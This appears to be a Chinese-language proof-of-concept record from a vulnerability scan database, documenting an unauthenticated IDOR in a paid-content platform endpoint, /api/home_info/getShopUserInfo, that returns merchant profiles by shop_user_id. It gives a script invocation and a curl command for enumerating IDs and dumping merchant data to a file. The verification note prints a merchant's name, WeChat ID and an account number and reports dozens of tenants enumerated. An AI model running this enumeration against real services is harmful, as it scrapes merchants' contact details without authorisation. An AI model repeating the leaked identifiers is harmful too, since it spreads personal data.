# 入驻方资料接口未授权 IDOR（shop_user_id 任意遍历泄露商家微信/公众号）

- **code**: 入驻方资料接口未授权-idor-shop_user_id-任意遍历泄露商家微信-公众号
- **kind**: poc
- **category**: unauthorized
- **component**: 自研 uni-app 付费内容平台后端（/api/home_info 模块）
- **severity**: high
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 已在 example.com 实测：shop_user_id=7 → 200 + agency_name=天衍科技数据中台 / wechat_number=Lw2580808 / gzh_number=18898972220；遍历 1..200 命中 39 个租户、25 个带联系方式。无需任何 token/Cookie/Authorization。
- **tags**: idor,unauthorized,business-logic,pii,wechat
- **created_at**: 2026-10-01T08:03:58.908Z
- **found_by**: vuln-scan

## 描述

POST /api/home_info/getShopUserInfo 只凭 shop_user_id 参数返回入驻方完整资料，服务端未校验 token。对照组同域 /api/user/index 与 /api/shop_common/goodsList 均返回 401，说明属鉴权缺失而非设计公开。无速率限制，可整库遍历。

## 用法

```
python3 idor_shop_info.py --base http://example.com --max 200 --delay 0.7 --out shops.json
或手工：curl -X POST "http://example.com/api/home_info/getShopUserInfo" -H "Content-Type: application/x-www-form-urlencoded" -d "shop_user_id=7"
```
